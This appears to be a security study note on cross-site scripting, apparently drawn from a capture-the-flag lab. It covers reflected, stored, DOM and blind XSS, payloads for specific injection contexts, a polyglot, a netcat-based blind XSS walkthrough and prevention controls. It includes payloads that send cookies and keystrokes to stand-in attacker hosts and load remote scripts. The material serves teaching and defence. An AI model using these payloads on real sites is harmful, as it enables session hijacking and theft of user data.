# XSS — Cross-Site Scripting

## 🔍 Overview

**XSS** is an injection attack where malicious JavaScript is injected into a web application and executed by other users' browsers. The server serves the attacker's code as if it were legitimate page content — the victim's browser has no way to tell the difference.

> **Root cause:** User-supplied input is written into a page without sanitisation or encoding — the browser interprets it as executable JavaScript rather than plain text.

| XSS Type | Where Payload Lives | Who Triggers It |
|----------|-------------------|----------------|
| **Reflected** | URL / request parameter | Victim clicks a crafted link |
| **Stored** | Database / server storage | Any user who visits the affected page |
| **DOM-based** | Browser's DOM — never sent to server | Victim visits a page with vulnerable client-side JS |
| **Blind** | Stored — but in a location the attacker can't see | Staff/admin who views the stored content |

---

## 💣 XSS Payloads

A payload has two components: the **intention** (what the JS does) and the **modification** (how it's adapted to execute in each specific context).

### Proof of Concept
Simplest payload — confirms XSS is possible:
```javascript
<script>alert('XSS');</script>
```

### Session Stealing
Steals the victim's session cookie, Base64-encodes it, and sends it to the attacker's server:
```javascript
<script>fetch('https://attacker.com/steal?cookie=' + btoa(document.cookie));</script>
```
> `btoa()` Base64-encodes the cookie to ensure safe transmission in a URL. The attacker decodes it and uses it to hijack the session without needing credentials.

### Key Logger
Forwards every keystroke typed on the page to the attacker:
```javascript
<script>document.onkeypress = function(e) {
    fetch('https://attacker.thm/log?key=' + btoa(e.key));
}</script>
```

### Business Logic Abuse
Calls an existing JavaScript function in the application — e.g. to change a user's email, enabling a password reset takeover:
```javascript
<script>user.changeEmail('attacker@hacker.thm');</script>
```

---

## 🔷 XSS Vulnerability Types

---

### 1️⃣ Reflected XSS

User-supplied data in an HTTP request is included in the page response without validation — the payload is reflected back in the same request.

**How it works:**
```
# App displays error messages directly from URL parameter
http://website.com/?error=input is invalid
→ <p>input is invalid</p>

# Attacker injects a script tag
http://website.com/?error=<script src="https://attacker.com/evil.js"></script>
→ <p><script src="https://attacker.com/evil.js"></script></p>
```

**Attack flow:**
```
1. Attacker crafts a malicious URL with XSS payload in the parameter
2. Attacker sends or embeds the link (email, iframe, another website)
3. Victim clicks the link
4. Browser executes the injected script in the context of the legitimate site
5. Attacker receives stolen data (cookies, session tokens)
```

**How to test:**
- Query string parameters (`?error=`, `?search=`, `?name=`)
- URL file path components
- HTTP request headers (User-Agent, Referer) if reflected in the response

---

### 2️⃣ Stored XSS

The payload is saved on the server (in a database, log, or file) and executed every time a user loads the affected page — no crafted link required.

**How it works:**
```
1. Attacker posts a comment containing a script tag on a blog
2. The comment is stored in the database without sanitisation
3. Every user who loads the comments page executes the attacker's script
4. Cookies, keystrokes, or other data are sent to the attacker
```

**Impact:** Persistent — affects every visitor. Can redirect users, steal sessions, or silently compromise accounts at scale.

**How to test:**
- Blog comments
- User profile fields (name, bio, location)
- Website listings or product descriptions
- Any input that is stored and later displayed to other users

---

### 3️⃣ DOM-Based XSS

The payload never reaches the server — it is injected and executed entirely in the browser via vulnerable client-side JavaScript that reads from attacker-controlled sources (e.g. `window.location.hash`) and writes to the DOM.

**How it works:**
```javascript
// Vulnerable JS reads from the URL hash and writes to the page
document.getElementById("output").innerHTML = window.location.hash.substring(1);

// Attacker crafts URL:
http://website.com/page#<script>alert('XSS')</script>

// The browser executes the script — the server never sees the payload
```

**How to test:** Read the page's JS source looking for:
- `window.location.x` values written to the DOM
- User-controlled values passed to `innerHTML`, `document.write()`, or `eval()`
- Parameters processed client-side before the server receives them

---

### 4️⃣ Blind XSS

Similar to Stored XSS — the payload is saved on the server — but it executes in a location the attacker cannot directly observe (e.g. an admin panel, support ticket system, or internal log viewer).

**Example:** A contact form sends a message to staff. The message is displayed in an internal staff portal. The attacker injects a payload that fires when a staff member views the message — sending back the portal URL, cookies, and session data.

**How to test:** Ensure your payload makes an out-of-band callback (HTTP request to your server) so you know when it fires — you won't see output directly.

**Tool:** [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express) — captures blind XSS callbacks with full context (cookies, URL, page source, screenshot).

---

## 🧩 Payload Contexts — Escaping the Injection Point

The HTML context where your input lands determines how the payload must be structured to execute. The same `<script>alert('THM')</script>` won't work in every situation.

| Level | Context | Payload |
|-------|---------|---------|
| **1** | Reflected directly into the page body | `<script>alert('THM');</script>` |
| **2** | Inside an `<input>` tag value | `"><script>alert('THM');</script>` — close the attribute and tag first |
| **3** | Inside a `<textarea>` tag | `</textarea><script>alert('THM');</script>` — close the textarea first |
| **4** | Inside an existing `<script>` block as a string | `';alert('THM');//` — break out of the string; `//` comments out the rest |
| **5** | `<script>` keyword is filtered (removed) | `<sscriptcript>alert('THM');</sscriptcript>` — after filter strips `script`, `<script>` remains |
| **6** | Inside `<img>` tag; `<>` characters filtered | `/images/cat.jpg" onload="alert('THM');` — inject into the `src` attribute and add an event handler |

---

## 🧬 XSS Polyglot

A polyglot is a single payload designed to escape multiple contexts simultaneously — useful when you don't know exactly where the input is reflected:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

> Polyglots work by including multiple escape sequences and event handlers — at least one is likely to break out of whatever context the input lands in.

---

## 🎯 Blind XSS — Practical Example

### Step 1 — Set Up a Listener

```bash
# Start a Netcat listener on port 9001
nc -nlvp 9001
```

| Flag | Description |
|------|-------------|
| `-n` | No DNS resolution — avoids hostname lookup delays |
| `-l` | Listen mode |
| `-v` | Verbose — shows connection details |
| `-p 9001` | Port to listen on |

### Step 2 — Build the Payload

```javascript
</textarea><script>fetch('http://YOUR_IP:9001?cookie=' + btoa(document.cookie));</script>
```

| Component | Description |
|-----------|-------------|
| `</textarea>` | Closes any textarea field the input may be inside |
| `fetch()` | Makes an HTTP request to your listener |
| `YOUR_IP:9001` | Your machine's IP and the Netcat port |
| `?cookie=` | Query parameter carrying the stolen cookie |
| `btoa(document.cookie)` | Base64-encodes the victim's cookies for safe URL transmission |

### Step 3 — Trigger and Decode

Submit the payload in the vulnerable field. When a staff member or admin views it, your Netcat listener receives the request with the Base64-encoded cookie.

```bash
# Decode the captured cookie
echo "eyJhZG1pbiI6dHJ1ZX0=" | base64 -d
```

Use the decoded session cookie to authenticate as the victim.

---

## 🛡️ Prevention

| Control | Description |
|---------|-------------|
| **Output encoding** | Encode user input before writing to the page — `<` → `&lt;`, `>` → `&gt;` — browser displays it as text, not HTML |
| **Input sanitisation** | Strip or reject dangerous tags and attributes server-side |
| **Content Security Policy (CSP)** | HTTP header restricting which scripts the browser will execute — blocks inline scripts and untrusted sources |
| **HttpOnly cookies** | Prevents JavaScript from accessing session cookies via `document.cookie` — limits session stealing impact |
| **Use safe DOM methods** | Prefer `textContent` over `innerHTML` — `textContent` never interprets input as HTML |
| **Framework auto-escaping** | Modern frameworks (React, Angular, Django) escape output by default — avoid using raw HTML injection methods like `dangerouslySetInnerHTML` |
